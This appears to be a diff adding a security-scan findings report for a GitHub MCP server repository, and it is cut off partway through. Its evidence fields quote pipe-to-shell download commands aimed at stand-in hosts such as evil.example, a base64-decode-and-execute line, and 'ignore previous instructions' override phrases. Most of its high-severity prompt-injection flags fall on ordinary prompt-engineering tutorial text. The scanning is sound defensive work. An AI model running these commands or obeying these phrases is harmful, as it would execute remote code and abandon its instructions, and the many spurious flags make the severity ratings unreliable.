@@ -1,0 +1,1009 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "marin-ai-tech/skillforge",
+    "version": "d795029c4ed70e1c3268cf5caff364c445e0f7b3",
+    "download": "https://codeload.github.com/marin-ai-tech/skillforge/tar.gz/d795029c4ed70e1c3268cf5caff364c445e0f7b3"
+  },
+  "archive_sha256": "bd7673411199bf3c464dac18ab6774f77bdc95a9de62439ab42bb5c65a7818d4",
+  "findings": [
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/tests/mcp-server-type.test.mjs",
+      "line": 89,
+      "evidence": "curl evil.example | sh",
+      "file_sha256": "2612d704e79aa3e7147b52acf2c2674278e81633c912e4ab2b7e8c29182df13f"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/tests/content-security-scan.test.mjs",
+      "line": 53,
+      "evidence": "curl -fsSL https://get.example.dev/install.sh | bash",
+      "file_sha256": "36c1b4c92447e4bcc8e4766d3ede278cf0e41891f1a54f7336f8fe0a84947cbf"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/tests/content-security-scan.test.mjs",
+      "line": 55,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "36c1b4c92447e4bcc8e4766d3ede278cf0e41891f1a54f7336f8fe0a84947cbf"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/tests/content-security-scan.test.mjs",
+      "line": 56,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "36c1b4c92447e4bcc8e4766d3ede278cf0e41891f1a54f7336f8fe0a84947cbf"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/tests/upstream-mirror.test.mjs",
+      "line": 129,
+      "evidence": "curl -fsSL https://x.example/i.sh | bash",
+      "file_sha256": "58e855d5e06c85bfbb39ad3dc6b59a07ec5ed57125c2c8474a531c9769eb3bbb"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/tests/release-signing.test.mjs",
+      "line": 119,
+      "evidence": "curl https://evil.example/x | sh",
+      "file_sha256": "f255200ade1510ab7e7bb26b8ba3ebf1b7030a63baf8ac65cf958867837d3e1e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/tests/tracked-sources.test.mjs",
+      "line": 165,
+      "evidence": "curl https://evil.example/x.sh | sh",
+      "file_sha256": "08d75a0a512a22199590b9b41fcbe15070e3a8c36b095eda95388c96422c6e0a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/web/src/help/topics/codes/E_SECURITY_BLOCKED.md",
+      "line": 20,
+      "evidence": "curl -fsSL https://example.dev/install.sh | bash",
+      "file_sha256": "0b2594eb8718243cad468b3b9c6fdba20283048d8fae00f6c5f59aa488188575"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/ecc-essentials/skills/codebase-onboarding/SKILL.md",
+      "line": 216,
+      "evidence": "p=0.97 - Writing an instructions file nobody asked for, or one longer than 100 lines — ",
+      "file_sha256": "c495bec2e78a7408d2469e7281b37d9f8c5d55e38445248dc1fa158dde96711f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/ecc-essentials/skills/codebase-onboarding/SKILL.md",
+      "line": 228,
+      "evidence": "p=0.92 ### Example 2: Write the agent instructions file for a project",
+      "file_sha256": "c495bec2e78a7408d2469e7281b37d9f8c5d55e38445248dc1fa158dde96711f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/ecc-essentials/skills/codebase-onboarding/SKILL.md",
+      "line": 233,
+      "evidence": "p=0.96 ### Example 3: Enhance the existing instructions file",
+      "file_sha256": "c495bec2e78a7408d2469e7281b37d9f8c5d55e38445248dc1fa158dde96711f"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/pragmatic-orchestration/references/prompting-nano-banana.md",
+      "line": 71,
+      "evidence": "p=0.98 ## Negative instructions",
+      "file_sha256": "23ce28f9b6a5f0b09a07611e1033f0f97ee1ac222c533eb802e6551373715e26"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/skills-management/references/06-patterns-and-troubleshooting.md",
+      "line": 311,
+      "evidence": "p=0.98 ### Instructions not followed",
+      "file_sha256": "a7693725af87eb69eca1babc6acb317c6cc4806248ca64dbd830854be8d28f41"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/skills-management/references/03-planning-and-design.md",
+      "line": 215,
+      "evidence": "p=0.97 ## Writing the main instructions",
+      "file_sha256": "f0895353717f35c46cceeac36b9ad1be91b2ae0c6d08809b5292da11dcacfa37"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/skills-management/references/03-planning-and-design.md",
+      "line": 265,
+      "evidence": "p=0.97 ### Best Practices for Instructions",
+      "file_sha256": "f0895353717f35c46cceeac36b9ad1be91b2ae0c6d08809b5292da11dcacfa37"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/SKILL.md",
+      "line": 3,
+      "evidence": "p=0.92 Universal prompt engineering techniques for any LLM. Use when crafting, optimizi",
+      "file_sha256": "c36c1ab55c008090eb696b6afee6fb55caa32340885f31220fddddd4ad153777"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/README.md",
+      "line": 56,
+      "evidence": "p=0.96 - \"improve this prompt\" - \"write a system prompt\" - \"audit this prompt\" - \"revie",
+      "file_sha256": "b913d0c803c69a7748bfcc2747e9dc64432380ebe393ae9b65f5597f119a7cca"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/failure-taxonomy.md",
+      "line": 37,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "da170a708dc0573799f2125944cb4f10ffac2838a13309b9df30032a7547889a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/failure-taxonomy.md",
+      "line": 22,
+      "evidence": "p=0.94 2. **Brittle instruction hierarchies** — Modern stacks use hierarchy (system > d",
+      "file_sha256": "da170a708dc0573799f2125944cb4f10ffac2838a13309b9df30032a7547889a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompt-audit-checklist.md",
+      "line": 53,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "5eb864d4114c1d5799e9e176d6c2b450982a14ef2d49f84796991f1d6ef6fa16"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/gpt56-sol-prompting.md",
+      "line": 148,
+      "evidence": "p=0.93 1. Switch the model and preserve current reasoning effort. 2. Run representative",
+      "file_sha256": "ba9fed13f850e0bc51bf0997ab86457cd7adbfa88a5e3ecff190a217e9e9171f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-techniques.md",
+      "line": 9,
+      "evidence": "p=0.94 Large language models (LLMs) today, such as GPT-3.5 Turbo, GPT-4, and Claude 3, ",
+      "file_sha256": "708c95f2702b81a5b34376f8a9d4156c2dbd15b4b7ba4a4f96b555056b0f6112"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-techniques.md",
+      "line": 28,
+      "evidence": "p=0.99 Instruction tuning has been shown to improve zero-shot learning [Wei et al. (202",
+      "file_sha256": "708c95f2702b81a5b34376f8a9d4156c2dbd15b4b7ba4a4f96b555056b0f6112"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-techniques.md",
+      "line": 98,
+      "evidence": "p=0.97 Standard few-shot prompting works well for many tasks but is still not a perfect",
+      "file_sha256": "708c95f2702b81a5b34376f8a9d4156c2dbd15b4b7ba4a4f96b555056b0f6112"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-techniques.md",
+      "line": 210,
+      "evidence": "p=0.99 The answer is incorrect! Now Let's try with the special prompt.",
+      "file_sha256": "708c95f2702b81a5b34376f8a9d4156c2dbd15b4b7ba4a4f96b555056b0f6112"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-techniques.md",
+      "line": 284,
+      "evidence": "p=0.94 It's important to note that meta prompting also assumes that the LLM has innate ",
+      "file_sha256": "708c95f2702b81a5b34376f8a9d4156c2dbd15b4b7ba4a4f96b555056b0f6112"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-techniques.md",
+      "line": 366,
+      "evidence": "p=0.98 Computing for the final answer involves a few steps (check out the paper for the",
+      "file_sha256": "708c95f2702b81a5b34376f8a9d4156c2dbd15b4b7ba4a4f96b555056b0f6112"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-techniques.md",
+      "line": 376,
+      "evidence": "p=0.96 Using a similar idea, can the model also be used to generate knowledge before ma",
+      "file_sha256": "708c95f2702b81a5b34376f8a9d4156c2dbd15b4b7ba4a4f96b555056b0f6112"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-techniques.md",
+      "line": 456,
+      "evidence": "p=0.98 Some really interesting things happened with this example. In the first answer, ",
+      "file_sha256": "708c95f2702b81a5b34376f8a9d4156c2dbd15b4b7ba4a4f96b555056b0f6112"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-techniques.md",
+      "line": 476,
+      "evidence": "p=0.95 Prompt chaining can be used in different scenarios that could involve several op",
+      "file_sha256": "708c95f2702b81a5b34376f8a9d4156c2dbd15b4b7ba4a4f96b555056b0f6112"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-techniques.md",
+      "line": 508,
+      "evidence": "p=0.99 The quotes that were returned in the first prompt can now be used as input to th",
+      "file_sha256": "708c95f2702b81a5b34376f8a9d4156c2dbd15b4b7ba4a4f96b555056b0f6112"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-techniques.md",
+      "line": 663,
+      "evidence": "p=0.98 This paper touches on an important topic related to prompt engineering which is ",
+      "file_sha256": "708c95f2702b81a5b34376f8a9d4156c2dbd15b4b7ba4a4f96b555056b0f6112"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-techniques.md",
+      "line": 701,
+      "evidence": "p=0.95 Let's look at an example using LangChain and OpenAI GPT-3. We are interested to ",
+      "file_sha256": "708c95f2702b81a5b34376f8a9d4156c2dbd15b4b7ba4a4f96b555056b0f6112"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-techniques.md",
+      "line": 789,
+      "evidence": "p=0.95 This will output the following:",
+      "file_sha256": "708c95f2702b81a5b34376f8a9d4156c2dbd15b4b7ba4a4f96b555056b0f6112"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 37,
+      "evidence": "p=0.99 You can achieve a lot with simple prompts, but the quality of results depends on",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 52,
+      "evidence": "p=0.97 Something to note is that when using the OpenAI chat models like `gpt-3.5-turbo`",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 54,
+      "evidence": "p=1.00 You can observe from the prompt example above that the language model responds w",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 71,
+      "evidence": "p=0.96 Is that better? Well, with the prompt above you are instructing the model to com",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 77,
+      "evidence": "p=0.96 You have tried a very simple prompt above. A standard prompt has the following f",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 96,
+      "evidence": "p=0.92 When prompting like the above, it's also referred to as *zero-shot prompting*, i",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 167,
+      "evidence": "p=1.00 As we cover more and more examples and applications with prompt engineering, you",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 171,
+      "evidence": "p=1.00 **Instruction** - a specific task or instruction you want the model to perform",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 191,
+      "evidence": "p=1.00 In the prompt example above, the instruction correspond to the classification ta",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 194,
+      "evidence": "p=0.99 You do not need all the four elements for a prompt and the format depends on the",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 206,
+      "evidence": "p=0.99 You can start with simple prompts and keep adding more elements and context as y",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 213,
+      "evidence": "p=0.98 Keep in mind that you also need to experiment a lot to see what works best. Try ",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 215,
+      "evidence": "p=0.95 Others recommend that you place instructions at the beginning of the prompt. Ano",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 233,
+      "evidence": "p=0.97 Be very specific about the instruction and task you want the model to perform. T",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 235,
+      "evidence": "p=0.99 When designing prompts, you should also keep in mind the length of the prompt as",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 266,
+      "evidence": "p=0.93 It's not clear from the prompt above how many sentences to use and what style. Y",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 275,
+      "evidence": "p=0.97 Here is an example of a movie recommendation chatbot failing at exactly what I d",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 345,
+      "evidence": "p=0.97 The \"A:\" is an explicit prompt format that you use in question answering. You us",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 359,
+      "evidence": "p=0.96 Without paying too much attention to the accuracy of the output above, which is ",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 381,
+      "evidence": "p=0.93 By now it should be obvious that you can ask the model to perform different task",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 389,
+      "evidence": "p=1.00 One of the best ways to get the model to respond with specific answers is to imp",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 412,
+      "evidence": "p=1.00 So far, you have used simple instructions to perform a task. As a prompt enginee",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 429,
+      "evidence": "p=1.00 You gave the instruction to classify the text and the model responded with `'Neu",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 447,
+      "evidence": "p=0.96 Perfect! This time the model returned `neutral` which is the specific label you ",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 464,
+      "evidence": "p=1.00 What is the problem here? As a hint, the made-up `nutral` label is completely ig",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 469,
+      "evidence": "p=0.92 Perhaps one of the more interesting things you can achieve with prompt engineeri",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 471,
+      "evidence": "p=0.91 For instance, let's create a conversational system that's able to generate more ",
+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-introduction.md",
+      "line": 488,
+      "evidence": "p=0.94 Our AI research assistant sounds a bit too technical, right? Okay, let's change ",
